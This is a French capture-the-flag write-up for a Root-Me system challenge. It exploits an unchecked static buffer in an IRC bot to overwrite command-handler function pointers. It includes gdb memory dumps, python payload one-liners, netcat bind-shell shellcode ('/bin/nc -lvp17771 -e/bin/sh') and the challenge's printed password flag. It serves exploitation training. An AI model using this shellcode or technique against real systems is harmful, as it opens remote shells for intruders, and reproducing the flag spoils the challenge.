@@ -1,0 +1,115 @@
+En analysant les sources fournis on remarque que next_param() ne check pas la taille donc cette fonction est vulnerable.
+Un coup de gdb, disas next_param:
+...
+   0x08048771 <+93>:	mov    $0x804b120,%eax
+   0x08048776 <+98>:	leave  
+   0x08048777 <+99>:	ret  
+...
+Nous informe que l'adresse de buff (variable static dans next_param() se trouve en 0x0804b120.
+
+En regardant a cette adresse on trouve...
+(gdb) x/80x 0x0804b120
+0x804b120 <buff.4746>:	0x00000000	0x00000000	0x00000000	0x00000000
+0x804b130 <buff.4746+16>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x804b140 <buff.4746+32>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x804b150:							0x00000000	0x00000000	0x00000000	0x00000000
+0x804b160 <Handler_List>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x804b170 <Handler_List+16>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b180 <Handler_List+32>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b190 <Handler_List+48>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b1a0 <Handler_List+64>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b1b0 <Handler_List+80>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b1c0 <Handler_List+96>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b1d0 <Handler_List+112>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b1e0 <Handler_List+128>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b1f0 <Handler_List+144>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b200 <Handler_List+160>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b210 <Handler_List+176>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b220 <Handler_List+192>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b230 <Handler_List+208>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b240 <Handler_List+224>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b250 <Handler_List+240>:		0x00000000	0x00000000	0x00000000	0x00000000
+
+...qu'apres notre buffer se trouve la fonction Handler_list(), fonction qui permet a notre bot de reconnaitre certaine commande.
+void init_handlers(void)
+{
+	add_handler("376", end_list_handle);
+	add_handler("JOIN", join_handle);
+	add_handler("PRIVMSG", privmsg_handle);
+	add_handler("PING", ping_handle);
+}
+On calcule, 16 fois 0x00000000 = 64 lettres rentre dans buff avant que cela n'ecrase Handler_list().
+
+En lancant ./ch31, on remarque que...
+$ r
+$ x/80x 0x0804b120
+0x804b120 <buff.4746>:	0x756f6321	0x00756f63	0x00000000	0x00000000
+0x804b130 <buff.4746+16>:			0x00000000	0x00000000	0x00000000	0x00000000
+0x804b140 <buff.4746+32>:			0x00000000	0x00000004	0x00000000	0x00000000
+0x804b150:							0x00000000	0x00000000	0x00000000	0x00000000
+0x804b160 <Handler_List>:			0x00363733	0x00000000	0x00000000	0x00000000
+0x804b170 <Handler_List+16>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b180 <Handler_List+32>:		0x00000000	0x080488d5	0x4e494f4a	0x00000000
+0x804b190 <Handler_List+48>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b1a0 <Handler_List+64>:		0x00000000	0x00000000	0x00000000	0x08048879
+0x804b1b0 <Handler_List+80>:		0x56495250	0x0047534d	0x00000000	0x00000000
+0x804b1c0 <Handler_List+96>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b1d0 <Handler_List+112>:		0x00000000	0x080488f8	0x474e4950	0x00000000
+0x804b1e0 <Handler_List+128>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b1f0 <Handler_List+144>:		0x00000000	0x00000000	0x00000000	0x080488ae
+0x804b200 <Handler_List+160>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b210 <Handler_List+176>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b220 <Handler_List+192>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b230 <Handler_List+208>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b240 <Handler_List+224>:		0x00000000	0x00000000	0x00000000	0x00000000
+0x804b250 <Handler_List+240>:		0x00000000	0x00000000	0x00000000	0x00000000
+...il faut 9 fois 0x00000000, soit 36 octets, pour reecrire le pointeur sur fonction de Handler_list[x].
+Donc:
+$ python -c 'print "privmsg pown3dbot !AAA" + "A"*60 + "PART" + "\x90"*32 + "\x08\x04\xb1\x21"[::-1]'
+...cette commande nous permettra de remplacer la commande "376" par "PART" et qu'une fois appeler, "PART" nous enverra a 0x0804b121 soit au debut de buff + 1.
+
+$ python -c 'print "privmsg pown3dbot !AAA" + "A"*60 + "PART"'
+Quand a cette commande elle defini le premier maillon de Handler_list a "PART" en mettant un \0 apres PART. (la commande precedente definissait la premiere commande en "PART + \x90*32").
+
+On recupere un bindshell assez petit pour rentrer dans buff, puis on l'injecte:
+$ python -c 'print "privmsg pown3dbot !" + "\x90"*3 + "\x31\xc0\x31\xd2\x50\x68\x37\x37\x37\x31\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"'
+
+Le mien ressemble a ca : execve("/bin/nc", {"/bin/nc", "-lvp17771", "-e/bin/sh", NULL}, NULL)
+
+Enfin on quitte irc, le serveur va automatiquement envoyer un message PART a tous les membres de #root-me_challenge et on sait ce qu'il se passera qund pown3dbot recevra une commande PART.
+Il ne nous reste plus qu'a lancer un netcat sur le bon port:
+$ nc localhost 17771
+$ ls
+bin
+boot
+cgroup
+challenge
+core
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+selinux
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+$ cd challenge/app-systeme/ch31
+$ cat .passwd
+2hrxc4djB6
+$ exit
+
+DONE !
